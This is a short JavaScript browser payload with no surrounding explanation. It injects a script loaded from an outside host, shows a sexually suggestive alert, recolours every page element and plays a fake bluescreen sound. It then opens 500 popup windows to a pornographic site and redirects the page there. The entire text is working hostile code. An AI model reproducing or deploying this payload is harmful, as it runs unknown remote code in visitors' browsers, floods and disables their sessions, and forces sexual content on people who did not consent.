(async function() {
	var NewElement = document.createElement("script")
	NewElement.setAttribute("src", "https://zaruak.000webhostapp.com/")
	document.head.appendChild(NewElement)
	alert("OwO\nUwU\nGive me that big gun of yours daddy~\n");
	var RandClr = function() {return "#"+(Math.random()*0xFFFFFF<<0).toString(16);}
	var RandClrs = function() {
		for (var Element of document.body.getElementsByTagName("*")) {
			Element.style.color = RandClr() 
			Element.style.background = RandClr()
		}
	}
	function Sleep(MS) { return new Promise(Resolve => setTimeout(Resolve, MS)); }
	RandClrs();
	(new Audio("https://cdn.discordapp.com/attachments/1134021747981688955/1134022212635078706/bluescreen.mp3")).play();
	Target = "https://rule34.xxx/index.php?page=post&s=random"
	for (var i=0;i<500; i++) { window.open(Target, "_blank"); if (i % 50 == 0) {RandClrs(); await Sleep(150); } }
	await Sleep(5000);
	window.location.replace(Target);
})()
